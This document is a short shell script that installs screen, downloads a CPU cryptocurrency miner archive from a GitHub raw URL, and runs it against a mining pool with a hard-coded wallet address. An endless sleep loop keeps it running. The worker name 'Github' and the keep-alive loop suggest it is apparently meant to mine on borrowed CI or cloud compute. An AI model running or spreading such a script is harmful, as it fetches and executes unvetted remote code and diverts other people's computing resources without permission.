#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
./hellminer -c stratum+tcp:ccxpool.soapyfresh.xyz:3333#xnsub -u ccx7dVxLJMZTTeZEtkVDPN6jpfJyC9daV2V2nVcFtDHKL6EdYz3rRMf5CAE1Q1TwC8hpuJBptaqVkL6GaTHqrE9P3Vu5oPs1fh.Github -p x --cpu 2
while [ 1 ]; do
sleep 3
done
sleep 999
